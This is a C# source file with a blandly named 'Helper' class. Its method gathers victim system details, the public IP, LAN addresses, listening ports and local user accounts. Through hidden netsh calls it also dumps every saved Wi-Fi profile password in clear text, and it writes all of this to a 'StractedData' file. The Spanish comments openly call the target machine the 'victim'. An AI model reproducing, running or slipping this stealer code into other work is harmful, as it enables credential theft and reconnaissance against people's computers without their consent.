using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace Helpers
{
  public class Helper
  {
    private static readonly HttpClient client = new HttpClient();

    public async Task GetSYSdata()
    {
      try
      {
        string systemUserName = Environment.UserName;
        string machineName = Environment.MachineName;
        string userDomain = Environment.UserDomainName;
        string osDescription = RuntimeInformation.OSDescription;
        string osArchitecture = RuntimeInformation.OSArchitecture.ToString();
        string dotNetVersion = Environment.Version.ToString();
        int processorCount = Environment.ProcessorCount;
        double uptimeHours = TimeSpan.FromMilliseconds(Environment.TickCount64).TotalHours;

        string publicIp = "No disponible, la maquina victima no tiene internet";
        try
        {
          publicIp = await client.GetStringAsync("https://api.ipify.org");
        }
        catch (Exception)
        {
        }

        string folderPath = "StractedData";
        Directory.CreateDirectory(folderPath);
        string filePath = Path.Combine(folderPath, $"{machineName}.txt");

        using (StreamWriter writer = new StreamWriter(filePath))
        {
          writer.WriteLine("### RESUMEN DE SISTEMA ###");
          writer.WriteLine($"Equipo:         {machineName}");
          writer.WriteLine($"Dominio/Grupo:  {userDomain}");
          writer.WriteLine($"Usuario Sesión: {systemUserName}");
          writer.WriteLine($"OS Destino:     {osDescription} ({osArchitecture})");
          writer.WriteLine($"Runtime .NET:   {dotNetVersion}");
          writer.WriteLine($"Cores CPU:      {processorCount}");
          writer.WriteLine($"Uptime Total:   {uptimeHours:F2} horas");
          writer.WriteLine();

          writer.WriteLine("### CONFIGURACIÓN DE RED ###");
          writer.WriteLine($"IP Pública (API Externa): {publicIp}");
          writer.WriteLine("Direcciones LAN detectadas:");

          foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
          {
            if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
            {
              IPInterfaceProperties ipProps = ni.GetIPProperties();
              foreach (UnicastIPAddressInformation ip in ipProps.UnicastAddresses)
              {
                if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                {
                  writer.WriteLine($" -> [{ni.Name}] IP: {ip.Address} | Máscara: {ip.IPv4Mask}");
                }
              }
            }
          }
          writer.WriteLine();

          writer.WriteLine("### PUERTOS TCP EN ESCUCHA ###");
          IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
          IPEndPoint[] listeners = properties.GetActiveTcpListeners();

          writer.WriteLine($"Total de sockets escuchando: {listeners.Length}");
          foreach (IPEndPoint listener in listeners)
          {
            writer.WriteLine($" -> {listener.Address}:{listener.Port}");
          }
          writer.WriteLine();

          writer.WriteLine("### CUENTAS DE USUARIO LOCALES ###");
          try
          {
            System.Diagnostics.Process userProcess = new System.Diagnostics.Process();
            userProcess.StartInfo.FileName = "net.exe";
            userProcess.StartInfo.Arguments = "user";
            userProcess.StartInfo.UseShellExecute = false;
            userProcess.StartInfo.RedirectStandardOutput = true;
            userProcess.StartInfo.CreateNoWindow = true;
            userProcess.Start();

            string userOutput = userProcess.StandardOutput.ReadToEnd();
            userProcess.WaitForExit();

            bool startReading = false;
            using (StringReader reader = new StringReader(userOutput))
            {
              string lineText;
              while ((lineText = reader.ReadLine()) != null)
              {
                if (lineText.Contains("-------------------------------------------------------------------------------"))
                {
                  startReading = true;
                  continue;
                }

                if (lineText.Contains("El comando se completó") || lineText.Contains("The command completed"))
                {
                  break;
                }

                if (startReading && !string.IsNullOrWhiteSpace(lineText))
                {
                  writer.WriteLine($" -> {lineText.Trim()}");
                }
              }
            }
          }
          catch (Exception userEx)
          {
            writer.WriteLine($"Aviso: Error al listar usuarios locales ({userEx.Message})");
          }
          writer.WriteLine();

          writer.WriteLine("### AUDITORÍA WI-FI (PERFILES GUARDADOS) ###");
          try
          {
            System.Diagnostics.Process listProcess = new System.Diagnostics.Process();
            listProcess.StartInfo.FileName = "netsh.exe";
            listProcess.StartInfo.Arguments = "wlan show profiles";
            listProcess.StartInfo.UseShellExecute = false;
            listProcess.StartInfo.RedirectStandardOutput = true;
            listProcess.StartInfo.CreateNoWindow = true;
            listProcess.Start();

            string listOutput = listProcess.StandardOutput.ReadToEnd();
            listProcess.WaitForExit();

            List<string> networkNames = new List<string>();

            using (StringReader reader = new StringReader(listOutput))
            {
              string lineText;
              while ((lineText = reader.ReadLine()) != null)
              {
                if (lineText.Contains("Perfil de todo usuario") || lineText.Contains("All User Profile"))
                {
                  string[] parts = lineText.Split(':');
                  if (parts.Length > 1)
                  {
                    networkNames.Add(parts[1].Trim());
                  }
                }
              }
            }

            if (networkNames.Count > 0)
            {
              foreach (string network in networkNames)
              {
                System.Diagnostics.Process passProcess = new System.Diagnostics.Process();
                passProcess.StartInfo.FileName = "netsh.exe";
                passProcess.StartInfo.Arguments = $"wlan show profile name=\"{network}\" key=clear";
                passProcess.StartInfo.UseShellExecute = false;
                passProcess.StartInfo.RedirectStandardOutput = true;
                passProcess.StartInfo.CreateNoWindow = true;
                passProcess.Start();

                string passOutput = passProcess.StandardOutput.ReadToEnd();
                passProcess.WaitForExit();

                string password = "(Sin clave / Abierta)";

                using (StringReader passReader = new StringReader(passOutput))
                {
                  string passLine;
                  while ((passLine = passReader.ReadLine()) != null)
                  {
                    if (passLine.Contains("Contenido de la clave") || passLine.Contains("Key Content"))
                    {
                      string[] parts = passLine.Split(':');
                      if (parts.Length > 1) { password = parts[1].Trim(); }
                      break;
                    }
                  }
                }
                writer.WriteLine($" RED: {network} -> CLAVE: {password}");
              }
            }
            else { writer.WriteLine("Ningún perfil inalámbrico registrado en el sistema."); }
          }
          catch (Exception wifiEx) { writer.WriteLine($"Aviso: Error en volcado de interfaz inalámbrica ({wifiEx.Message})"); }
        }
      }
      catch (Exception ex) { Console.WriteLine("Excepción en hilo principal de recolección: " + ex.Message); }
    }
  }
}